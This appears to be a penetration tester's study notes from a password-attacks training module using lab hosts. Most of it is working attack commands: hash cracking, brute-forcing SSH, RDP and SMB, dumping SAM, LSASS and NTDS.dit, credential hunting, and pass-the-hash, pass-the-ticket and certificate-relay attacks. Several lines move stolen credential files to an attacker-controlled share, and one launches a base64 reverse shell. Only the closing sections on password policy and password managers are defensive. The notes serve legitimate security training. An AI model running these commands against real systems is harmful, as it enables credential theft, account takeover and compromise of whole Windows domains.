# Password Attacks

Authentication = validating identity via factors: something you know (password/PIN), have (card/device), are (biometrics), somewhere you are (IP/location). Passwords still dominate, and humans are the weak point: ~66% reuse passwords across accounts, ~55% keep a password after it appears in a breach. HaveIBeenPwned tells you (or your target) which breaches an email has appeared in — one cracked password often opens other platforms.

## Introduction to Password Cracking

Hashes are one-way:

```bash
echo -n 'Soccer06!' | md5sum
echo -n 'Soccer06!' | sha256sum
```

- **Rainbow tables** — precomputed input→hash maps, instant lookups. Defeated by **salting**: random bytes added before hashing (`echo -n 'Th1sIsTh3S@lt_Soccer06!' | md5sum`). Salts aren't secret (stored alongside the hash, needed for verification) — they just explode the table size (1 salt byte = 256× the entries).
- **Brute-force** — every combination; 100% effective given time, realistic only under ~9 chars. Speed is algorithm-bound: hashcat on a laptop ≈ 5M/s against MD5 vs ~10k/s against DCC2.
- **Dictionary** — wordlist of statistically likely passwords; the pentester's default. rockyou.txt = 14M real passwords leaked from RockYou in 2009 (stored unencrypted). SecLists is the other main source.

## Introduction to John The Ripper

Use the **jumbo** variant (optimizations, more formats, 64-bit). Cracking modes:

- **Single crack** — generates candidates from the account's own data (username, home dir, GECOS real name/phone). Built for Linux passwd/shadow files:

```bash
john --single passwd
```

- **Wordlist** — dictionary mode, multiple lists comma-separated, `--rules` to mutate:

```bash
john --wordlist=<wordlist> <hash_file>
```

- **Incremental** — Markov-modeled brute force, tries likely combinations first; slowest. Configurable charsets in `john.conf` under `[Incremental:...]`:

```bash
john --incremental <hash_file>
```

Unknown hash format: check JtR's sample-hash docs, or:

```bash
hashid -j 193069ceb0461e1d40d216e32c79c704     # suggests formats + JtR format names
```

hashid is often ambiguous (a bare 32-hex string matches MD2/MD5/MD4/NTLM/...). Context of where the hash came from usually decides it. Tell JtR the format with `--format=` — common ones: `raw-md5`, `raw-sha1/sha256/sha512`, `nt`, `netntlmv2`, `mysql`, `mysql-sha1`, `mssql`, `mssql05`, `krb5`, `mscash2`, `ssh`, `pdf`, `zip`, `rar`.

Cracking encrypted files — the *2john* converters produce JtR-ready hashes:

```bash
<tool> <file_to_crack> > file.hash
locate *2john        # full inventory on the box
```

ssh2john, zip2john, rar2john, pdf2john, office2john, keepass2john, bitlocker2john, gpg2john, putty2john, pfx2john, keychain2john, vncpcap2john, hccap2john/wpa2john, truecrypt_volume2john, mscash2john, 1password2john, 7z2john, androidbackup2john...

## Introduction to Hashcat

```bash
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

`-a` = attack mode, `-m` = hash type ID (`hashcat --help` lists all; hashcat.net example hashes page for identification; `hashid -m <hash>` suggests the mode).

**Dictionary (-a 0):**

```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 rockyou.txt
# wordlist not enough → apply rules:
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c rockyou.txt -r best64.rule
```

Rules live in /usr/share/hashcat/rules — best64 (the standard first try), dive, d3ad0ne, generated, rockyou-30000, T0XlC*, toggles*, leetspeak variants.

**Mask (-a 3)** — brute force over a user-defined keyspace. Built-in charsets: `?l ?u ?d ?h ?H ?s ?a ?b`; custom sets via `-1`..`-4` referenced as `?1`..`?4`.

```bash
hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'    # uppercase + 4 lowercase + digit + symbol
```

## Writing Custom Wordlists and Rules

Users follow predictable mutations to satisfy policies: `Password → Password123 → Password2022 → Password2022! → P@ssw0rd2022!`. Company name, pets, hobbies, months/seasons + year are the usual ingredients (OSINT feeds this). Most passwords are ≤10 chars.

Hashcat rule syntax for generating candidates:

```text
:      do nothing
l / u  lowercase / uppercase all
c      capitalize first, lowercase rest
sXY    replace all X with Y
$!     append !
```

custom.rule combining them (`c`, `so0`, `sa@`, `$!` and combinations), then:

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

15 variants from one word. Build wordlists from the target's own site with CeWL:

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
# -d spider depth, -m min word length
```

## Cracking Protected Files

Hunt for document types on a compromised host:

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
```

SSH keys have no extension — find them by header/footer:

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Old PEM keys declare encryption in the header (`Proc-Type: 4,ENCRYPTED`, `DEK-Info: AES-128-CBC,...`); modern keys look identical either way. Test with `ssh-keygen -yf key` — a passphrase prompt means encrypted. Crack:

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```

Documents follow the same pattern — `office2john.py Protected.docx > hash` for all common Office formats, `pdf2john.py PDF.pdf > hash`, then JtR/hashcat. Worth trying even against strong passwords: the contents often carry access further.

## Cracking Protected Archives

Common archive types: tar, gz, rar, zip, cpt, truecrypt, bitlocker, kdbx, 7z, gzip. Not all support passwords natively (tar is usually encrypted with openssl/gpg on top). Pull a full extension reference:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

**ZIP** — same 2john pattern:

```bash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**OpenSSL-encrypted GZIP** — identify with `file` → "openssl enc'd data with salted password". Hash-cracking is flaky here; more reliable: loop decryption directly and let success pick the password (gzip errors are normal noise):

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
# check ls afterwards for the extracted file
```

**BitLocker** (AES 128/256, full-disk; 48-digit recovery key also exists):

```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash    # hashes 1-2 = password, 3-4 = recovery key (don't bother)
hashcat -a 0 -m 22100 '$bitlocker$0$...' rockyou.txt   # slow (~25 H/s) — be patient
```

Mounting: Windows — double-click the .vhd, then the BitLocker volume prompts for the password. Linux — dislocker:

```bash
sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
# cleanup: umount /media/bitlockermount && umount /media/bitlocker
```

## Network Services

Every service with username/password auth is a password-attack surface (FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP).

**WinRM** (TCP 5985 HTTP / 5986 HTTPS). NetExec validates credentials fast:

```bash
netexec winrm <TARGET_IP> -u user.list -p password.list
# [+] None\user:password (Pwn3d!)   ← Pwn3d! = likely command execution

evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>    # gem install evil-winrm
```

**SSH** (22):

```bash
hydra -L user.list -P password.list ssh://<TARGET_IP>     # add -t 4, SSH limits parallel tasks
ssh user@<TARGET_IP>
```

**RDP** (3389):

```bash
hydra -L user.list -P password.list rdp://<TARGET_IP>     # -t 1/-t 4, -W 1/-W 3 — RDP hates parallel connections
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

**SMB** (445):

```bash
hydra -L user.list -P password.list smb://<TARGET_IP>
```

Hydra "[ERROR] invalid reply" against SMBv3 = outdated hydra; either rebuild it or use `auxiliary/scanner/smb/smb_login` (set USER_FILE, PASS_FILE, RHOSTS). After creds land:

```bash
netexec smb <TARGET_IP> -u user -p password --shares
smbclient -U user \\\\<TARGET_IP>\\<SHARE>
```

## Spraying, Stuffing, and Defaults

- **Password spraying** — one password, many accounts. Deadly where new users get a standard initial password (`ChangeMe123!`). Burp for web apps; NetExec/Kerbrute for AD:

```bash
netexec smb <SUBNET>/24 -u usernames.list -p 'ChangeMe123!'
```

- **Credential stuffing** — leaked username:password pairs replayed elsewhere. With a combo list:

```bash
hydra -C user_pass.list ssh://<TARGET_IP>
```

- **Default credentials** — routers, firewalls, databases. Automated lookup:

```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```

Classic router defaults: Linksys/D-Link/3Com/BenQ `admin:Admin` at 192.168.1.1, Belkin `admin:admin`, Netgear `admin:password`, Digicom `admin:Michelangelo`. Also check product documentation.

## Windows Authentication Process

Interactive logon chain: WinLogon (launches LogonUI, collects creds via COM credential providers) → LSASS → authentication packages (DLLs) → SAM or AD.

- **Lsasrv.dll** — LSA server; Negotiate picks NTLM vs Kerberos
- **Msv1_0.dll** — local machine logons
- **Samsrv.dll** — SAM (local accounts)
- **Kerberos.dll** — Kerberos auth
- **Netlogon.dll** — network logon service
- **Ntdsa.dll** — DSA managing ntds.dit (DCs only)

**SAM** — local account hashes (LM/NTLM), `%SystemRoot%\system32\config\SAM`, mounted at HKLM\SAM, SYSTEM privileges to read. Workgroup box = local SAM validates; domain-joined = DC validates against ntds.dit (`%SystemRoot%\ntds.dit`). SYSKEY partially encrypts SAM on disk. **Credential Manager** stores per-user at `C:\Users\<user>\AppData\Local\Microsoft\[Vault/Credentials]\`. **NTDS.dit** holds user accounts + hashes, groups, computers, GPOs — synchronized across DCs.

## Attacking SAM, SYSTEM, and SECURITY

With local admin, grab the hives (SAM = local hashes, SYSTEM = bootkey that decrypts SAM, SECURITY = DCC2 cached domain creds / LSA secrets / DPAPI keys):

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Exfil via attacker SMB share (smb2support or modern Windows won't connect):

```bash
impacket-smbserver -smb2support CompData /home/user/share
```

```cmd
move sam.save \\<ATTACKER_IP>\CompData
```

Dump offline — secretsdump pulls the bootkey from SYSTEM first, then SAM (`uid:rid:lmhash:nthash`), cached domain logons, LSA secrets, DPAPI keys:

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Crack the NT hashes (mode 1000):

```bash
hashcat -m 1000 hashestocrack.txt rockyou.txt
```

**DCC2** (cached domain creds from SECURITY): `$DCC2$10240#user#<hash>`, PBKDF2 → ~800× slower than NTLM and useless for PtH. Mode 2100.

**DPAPI** keys also come out of that dump — they unlock Chrome/IE saved passwords, Outlook, RDP saved creds, Credential Manager. Decrypt with Impacket's dpapi tool, mimikatz (`dpapi::chrome /in:"...\Login Data" /unprotect`), or remotely with DonPAPI.

Remote one-shots with local-admin creds:

```bash
netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --lsa    # LSA secrets + dpapi keys + NL$KM
netexec smb <TARGET_IP> --local-auth -u bob -p <PASSWORD> --sam    # local SAM hashes
```

## Attacking LSASS

LSASS caches credentials, mints tokens, writes the security log. Dump its memory, crack offline.

- **Task Manager** (GUI session): Processes → Local Security Authority Process → Create dump file → `lsass.DMP` in %temp%.
- **rundll32** (shell session; modern AV flags this):

```cmd
tasklist /svc                    # find lsass.exe PID
Get-Process lsass                # PowerShell alternative
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

Extract on the Linux attack host with pypykatz (Mimikatz in Python — runs from Linux against the dump file):

```bash
pypykatz lsa minidump lsass.dmp
```

What the output gives you per logon session:

- **MSV** — username, domain, SID, NT + SHA1 hashes
- **WDIGEST** — cleartext passwords when enabled (default on XP–8 / 2003–2012; disabled on modern Windows, patch exists for old systems)
- **Kerberos** — cached passwords, ekeys, tickets, pins → reuse for domain access
- **DPAPI** — masterkeys → decrypt that user's DPAPI blobs

Then `hashcat -m 1000 <NTHASH> rockyou.txt`.

## Attacking Windows Credential Manager

Vault folders (each with a Policy.vpol holding DPAPI-protected AES keys that encrypt the credentials): `%UserProfile%\AppData\Local\Microsoft\Vault\` and `...\Credentials\`, plus Roaming/ProgramData/systemprofile variants. Newer Windows adds Credential Guard (VBS-protected masterkeys). Two locker types: Web Credentials (IE/legacy Edge) and Windows Credentials (OneDrive tokens, domain creds, shares, services).

Enumerate and abuse:

```cmd
cmdkey /list                                  # Target / Type / User / Persistence per entry
runas /savecred /user:SRV01\mcharles cmd      # use a stored Domain:interactive credential
rundll32 keymgr.dll,KRShowKeyMgr              # export vault to .crd
```

With mimikatz (admin): `privilege::debug` then `sekurlsa::credman` dumps the stored credentials from memory. SharpDPAPI, LaZagne, DonPAPI do the same job.

## Attacking Active Directory and NTDS.dit

Domain-joined machines still allow local SAM logons (`HOSTNAME\user` or `.\user` at the logon UI). Dictionary attacks against AD are noisy (event 4776 for every NTLM validation) and risk lockouts — note: default domain GPO historically has **no** account lockout policy.

Build the username list first. Conventions: `jdoe`, `jjdoe`, `janedoe`, `jane.doe`, `doe.jane`. Email structure = username (`jdoe@domain` → jdoe). Tips from the module: Google `"@inlanefreight.com"` for valid addresses; dorks like `inlanefreight.com filetype:pdf` leak usernames in PDF metadata; some orgs alias real usernames to opaque ones (a907) specifically to break spraying.

```bash
./username-anarchy -i names.txt                  # auto-generate every convention per name

# confirm valid usernames before password guessing (Kerberos pre-auth enumeration):
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> names.txt

# dictionary attack via SMB:
netexec smb <DC_IP> -u bwilliamson -p fasttrack.txt
# [+] ...:P@55w0rd!  → watch lockout policy; one attempt per user is safer (spraying)
```

**Capturing NTDS.dit** (needs local admin/DA on the DC):

```bash
evil-winrm -i <DC_IP> -u bwilliamson -p '<PASSWORD>'
```

```powershell
net localgroup          # check Administrators membership
net user bwilliamson    # check Domain Admins membership
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\CompData
```

Like SAM, NTDS.dit hashes are encrypted with a key in SYSTEM — grab both. Offline:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL    # finds/decrypts the PEK, dumps all domain hashes (+ AES keys for Kerberos)
```

Or the one-liner that does VSS + dump + cleanup itself:

```bash
netexec smb <DC_IP> -u bwilliamson -p '<PASSWORD>' -M ntdsutil
# filter enabled accounts afterwards:
grep -iv disabled <ntds-output-file> | cut -d ':' -f1
```

Crack with `-m 1000`; uncrackable Administrator hash → Pass the Hash:

```bash
evil-winrm -i <DC_IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Credential Hunting in Windows

Search terms worth grepping for: passwords, passphrases, keys, username, user account, creds, users, passkeys, configuration, dbcredential, dbpassword, pwd, login, credentials. Windows Search works with GUI access; from CLI:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

LaZagne harvests application-stored credentials — keep a standalone copy to drop on targets:

```cmd
start LaZagne.exe all        :: -vv for verbose; per-module: browsers, chats, mails, memory, sysadmin, windows, wifi
```

Browsers are the richest target (35 supported on Windows; chrome/edge/firefox stores are encrypted but decryptable — firefox_decrypt, decrypt-chrome-passwords). Also check: passwords in GPO/scripts on SYSVOL, scripts on IT shares, web.config on dev machines, unattend.xml, AD user/computer description fields, KeePass databases, and files literally named pass.txt / passwords.docx / passwords.xlsx on systems, shares, and SharePoint.

## Linux Authentication Process

PAM (`pam_unix.so` in `/usr/lib/x86_64-linux-gnu/security/`) reads/writes `/etc/passwd` and `/etc/shadow`.

**/etc/passwd** — 7 colon fields: username, password, UID, GID, GECOS, home, shell. World-readable. `x` = hash in shadow; a hash here (ancient systems) = crackable; a *writable* passwd lets you blank root's password field entirely (`root::0:0:...` → passwordless `su`).

**/etc/shadow** — 9 fields; password format `$<id>$<salt>$<hashed>`. IDs: `1` MD5, `2a` Blowfish, `5` SHA-256, `6` SHA-512, `y` yescrypt (Debian default now), `gy` gost-yescrypt, `7` scrypt. `!` or `*` = no password login (other auth methods may still work); empty = no password required. Watch the algorithm — MD5 cracks vastly faster than SHA-512.

**/etc/security/opasswd** — PAM's old-password history (root-readable). Old hashes there reveal patterns for guessing the current password.

Cracking Linux creds as root:

```bash
cp /etc/passwd /tmp/passwd.bak; cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt    # 1800 = sha512crypt
```

This exact scenario is what JtR single crack mode was designed for.

## Credential Hunting in Linux

Four hunting buckets: **files** (configs, databases, notes, scripts, cronjobs, SSH keys), **history** (logs, command history), **memory** (cache, in-memory processing), **key-rings** (browser stores). Adapt to the box's role — an isolated DB server won't have normal users.

```bash
# config files (.conf/.config/.cnf), then grep them for creds
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# notes (named anything, extension or not)
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# cronjobs (creds hardcoded for automation)
cat /etc/crontab
ls -la /etc/cron.*/          # .d, .daily, .hourly, .monthly, .weekly

# history
tail -n5 /home/*/.bash*      # .bash_history, .bashrc, .bash_profile

# logs — auth hits
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|failure\|failed\|ssh\|sudo\|COMMAND\=" $i 2>/dev/null;fi;done
```

Key log files: `/var/log/auth.log` (Debian) / `secure` (RHEL), `faillog`, `cron`, `mail.log`, `httpd`, `mysqld.log`, `syslog`/`messages`.

Memory and stores:

```bash
sudo python3 mimipenguin.py              # plaintext creds from memory (GNOME keyring etc.)
sudo python2.7 laZagne.py all            # wifi, ssh, shadow, AWS, keepass, git, browsers, keyrings...
```

Firefox keeps saved logins in `~/.mozilla/firefox/<profile>/logins.json` (+ key4.db) — decrypt with `python3.9 firefox_decrypt.py`, or `python3 laZagne.py browsers`.

## Credential Hunting in Network Traffic

Legacy/misconfigured services still speak plaintext. Pairs to know: HTTP/HTTPS, FTP/FTPS, SNMP/SNMPv3, POP3/POP3S, IMAP/IMAPS, SMTP/SMTPS, LDAP/LDAPS, DNS/DoH, SMB/SMB3-over-TLS, VNC/VNC-TLS.

Wireshark filters that matter for hunting:

```text
http                                  # plaintext web traffic
http.request.method == "POST"         # form logins
http contains "passw"                 # string in packets (also Edit > Find Packet)
ip.addr == <IP> / tcp.port == 80
tcp.stream eq 53                      # follow one conversation
ip.src == A && ip.dst == B
tcp.flags.syn == 1 && tcp.flags.ack == 0   # scanning/connection attempts
```

Pcredz automates it over pcaps or live interfaces — pulls credit card numbers, POP/SMTP/IMAP creds, SNMP community strings, FTP creds, HTTP basic/NTLM headers and forms, NTLMv1/v2 from SMB/LDAP/MSSQL/RPC/HTTP, and Kerberos AS-REQ pre-auth (etype 23) hashes:

```bash
./Pcredz -f demo.pcapng -t -v
```

## Credential Hunting in Network Shares

Patterns first: keywords `passw`, `user`, `token`, `key`, `secret`; extensions `.ini .cfg .env .xlsx .ps1 .bat`; filenames containing config/user/passw/cred/initial; the `DOMAIN\` string inside files. Localize keywords for the target (German org → "Benutzer"). Be strategic — IT shares beat photo shares.

Windows (domain-joined):

```cmd
Snaffler.exe -s      :: auto-discovers shares + interesting files (e.g. unattend.xml AdministratorPassword hits)
                     :: -u search for AD user references, -i/-n include/exclude shares
```

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public   # PowerHuntShares — HTML report, hours in big envs
```

Linux:

```bash
# MANSPIDER (docker), content search:
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET_IP> -c 'passw' -u <USER> -p '<PASSWORD>'

# NetExec spider:
nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --spider IT --content --pattern "passw"
```

All of these need manual review — false positives are the norm.

## Pass the Hash (PtH)

NTLM hashes are unsalted and static until the password changes — authenticate *with the hash*, no cracking required. Hash sources: SAM dump, NTDS.dit, LSASS memory.

Windows:

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTHASH> /domain:inlanefreight.htb /run:cmd.exe" exit
```

Invoke-TheHash (no local admin needed client-side; the hash's account needs admin on target):

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add"
Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "powershell -e <base64-revshell>"
```

Linux:

```bash
impacket-psexec administrator@<TARGET_IP> -hashes :<NTHASH>     # also: wmiexec, atexec, smbexec

netexec smb <SUBNET>/24 -u Administrator -d . -H <NTHASH>            # spray the hash across the subnet
netexec smb <SUBNET>/24 -u Administrator --local-auth -H <NTHASH>    # local-admin hash reuse (gold images)
netexec smb <TARGET_IP> -u Administrator -d . -H <NTHASH> -x whoami  # Pwn3d! + command exec

evil-winrm -i <TARGET_IP> -u Administrator -H <NTHASH>               # domain account: administrator@domain
xfreerdp /v:<TARGET_IP> /u:julio /pth:<NTHASH>                       # RDP PtH — needs Restricted Admin Mode
```

RDP PtH prerequisite (else "Account restrictions..." error):

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

UAC limits PtH for **local** accounts: `LocalAccountTokenFilterPolicy = 0` means only the built-in RID-500 Administrator can do remote admin (unless `FilterAdministratorToken = 1`, which enrolls even RID-500 in UAC). Domain accounts with admin rights are exempt. Local admin password reuse across hosts is rampant (gold images) — the client fix is LAPS.

## Pass the Ticket (PtT) from Windows

Kerberos in one breath: user encrypts a timestamp with their password hash → KDC (DC) validates and returns a **TGT**; TGT is presented to request **TGS** per service. A stolen ticket (TGS for one resource, TGT for anything the user can reach) = lateral movement without the password.

Harvest (as admin, all tickets; non-admin gets only your own):

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export     :: .kirbi files; ending in $ = computer account; service "krbtgt" = that account's TGT

Rubeus.exe dump /nowrap                 :: same data as Base64
```

**Pass the Key / OverPass the Hash** — convert a key/hash into a fresh TGT. Dump keys first:

```cmd
mimikatz # sekurlsa::ekeys      :: yields aes256_hmac + rc4_hmac per user
```

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256KEY> /nowrap     :: Rubeus needs no admin
```

Prefer AES keys over rc4/NTLM in Kerberos exchanges — rc4 in a modern domain (2008+) reads as an encryption downgrade.

**PtT** — import and go:

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<HASH> /ptt      :: request + import in one
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
Rubeus.exe ptt /ticket:<base64-kirbi>
mimikatz # kerberos::ptt ticket.kirbi        :: misc::cmd opens a cmd with the ticket applied

# kirbi -> base64:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

Then `dir \\DC01\c$`, or PowerShell Remoting (admin / Remote Management Users membership):

```powershell
Enter-PSSession -ComputerName DC01
```

To avoid trashing your current session's TGT, use a sacrificial logon session first:

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
:: then run asktgt /ptt from the new window
```

## Pass the Ticket (PtT) from Linux

Linux stores tickets as **ccache** files (`/tmp/krb5cc_*`, path in `KRB5CCNAME`) and **keytab** files (principal + encrypted key pairs; portable; must be recreated on password change). Machine account keytab: `/etc/krb5.keytab` (root-only) — owning it = impersonating `HOST$`.

Confirm domain membership:

```bash
realm list                          # domain, permitted users/groups
ps -ef | grep -i "winbind\|sssd"    # fallback check
```

Find the goods:

```bash
find / -name *keytab* -ls 2>/dev/null      # need rw on the file to use it
env | grep -i krb5                          # KRB5CCNAME=FILE:/tmp/krb5cc_...
ls -la /tmp                                 # every logged-in user's ccache
crontab -l                                  # scripts often kinit with a keytab
```

Impersonate with a keytab:

```bash
klist -k -t /opt/specialfiles/carlos.keytab     # shows the principal — kinit is CASE-SENSITIVE (user lowercase, DOMAIN uppercase)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist                                            # confirm new default principal
smbclient //dc01/carlos -k -no-pass -c ls
```

Crack a keytab's secrets instead:

```bash
python3 keytabextract.py carlos.keytab      # → NTLM, AES-256, AES-128 hashes
# NTLM → PtH; AES → forge tickets or crack (crackstation.net is fast for NTLM)
```

Abuse a ccache (read access is enough — root gets everyone's):

```bash
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist                                        # check principal + expiry — expired tickets are dead
smbclient //dc01/C$ -k -no-pass
```

From a non-domain attack host: proxy to the KDC (Chisel + proxychains) and hardcode resolution:

```bash
# /etc/hosts: 172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
# /etc/proxychains.conf: socks5 127.0.0.1 1080
sudo ./chisel server --reverse                      # attacker
c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks   # on MS01

export KRB5CCNAME=/path/to/krb5cc_file
proxychains impacket-wmiexec dc01 -k                # hostname, never IP; -no-pass if prompted
```

evil-winrm over Kerberos needs krb5 config:

```bash
sudo apt-get install krb5-user -y        # realm = DOMAIN (uppercase), KDC = dc01
# /etc/krb5.conf: [libdefaults] default_realm = <REALM>; [realms] <REALM> = { kdc = dc01.domain }
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

Ticket format conversion:

```bash
impacket-ticketConverter krb5cc_... julio.kirbi    # ccache <-> kirbi, both directions
```

Linikatz (Cisco) = mimikatz for Linux-AD boxes — as root, pulls credentials + tickets from SSSD/FreeIPA/Samba/Vintella into a `linikatz.*` folder (ccache + keytab formats ready to reuse).

## Pass the Certificate

PKINIT = Kerberos initial authentication with public keys (smart cards). Pass-the-Certificate = trading an X.509 cert for a TGT. Pairs with AD CS attacks and Shadow Credentials.

**ESC8** — relay NTLM to the CA's HTTP web enrollment (`/CertSrv`):

```bash
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py <DOMAIN>/user:'<PASSWORD>'@<DC_IP> <ATTACKER_IP>    # coerce DC01$ to authenticate (needs Spooler)
# relay output: GOT CERTIFICATE → DC01$.pfx
```

Exchange the PFX for a TGT (PKINITtools):

```bash
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache
# note the AS-REP encryption key it prints — needed for some follow-ups
```

Now it's PtT again — and as DC01$ you can DCSync:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@DC01.<DOMAIN>
```

**Shadow Credentials** — with write rights over a victim's `msDS-KeyCredentialLink` (BloodHound: AddKeyCredentialLink edge), plant your own key:

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u wwhite -p '<PASSWORD>' --target jpinkman --action add
# → prints a PFX file + its password
python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass '<PFX-PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
evil-winrm -i dc01.<DOMAIN> -r <DOMAIN>       # if the victim is in Remote Management Users
```

No PKINIT support on the KDC for your victim? PassTheCert authenticates to LDAPS with the cert directly (password changes, granting DCSync rights).

## Password Policies

A policy = definition (rules for creation/storage/rotation/transmission) + enforcement (tech, e.g. AD Password Policy GPO, plus communicated processes). Standards to anchor on: NIST SP800-63B, CIS Password Policy Guide, PCI DSS.

Modern direction: **disable** periodic expiration — forced rotation breeds `Inlanefreight01! → 02! → 03!` patterns that satisfy policy and stay guessable. Blacklist in policy: company name, company-related words, months, seasons, welcome/password variants, the obvious (`password`, `123456`). Strong passwords: generated (`CjDC2x[U`) or long passphrases (`()The name of my dog is Popy!`) — but remember attackers OSINT the passphrase ingredients.

## Password Managers

Average person: ~100 passwords — hence reuse. Managers store everything in an encrypted database under a master password (KDFs, salted). Cloud (1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass, RoboForm) sync across devices with zero-knowledge designs (Bitwarden: master key from master password via KDF, separate auth hash for the server, derived decryption key for vault items). Local (KeePass, KWalletManager, Pleasant Password Server, Password Safe) keeps the database on your machine — same crypto family, you own the storage risk. Feature checklist: 2FA, multi-platform, browser extension, autocomplete, import/export, generation.

Alternatives beyond passwords: MFA, FIDO2 (YubiKey), OTP/TOTP, IP restrictions, device compliance (Intune/Workspace ONE) — and the passwordless push (Microsoft, Auth0, Okta, Ping): possession/inherent factors instead of knowledge factors.